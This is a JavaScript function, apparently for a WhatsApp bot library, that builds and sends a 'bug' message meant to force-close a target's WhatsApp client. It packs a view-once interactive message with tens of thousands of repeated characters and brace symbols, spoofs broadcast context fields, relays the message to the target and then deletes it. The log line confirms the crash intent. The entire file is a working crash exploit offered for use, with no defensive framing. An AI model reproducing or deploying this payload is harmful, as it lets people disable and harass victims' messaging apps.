async function XProtexBetaXxV5(target) {
  try{
    const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "🧬⃟༑⌁⃰𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬ཀ‌‌🪅" + "ꦽ".repeat(50000),
            },
            footer: {
              text: "ꦽ".repeat(50000),
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson:
                     ""
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson:
                     ""
                }
              ]
            }
          },
        },
      },
    },
    {}
  );
  
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });

  await sock.sendMessage(target, { delete: msg.key });
  console.log(chalk.red(`Succes Sending Bug Forclose To ${target}`));
 } catch (err) {
    console.error("Terdapat Kesalahan Pada Struktur Function", err);
    throw err;
  }
}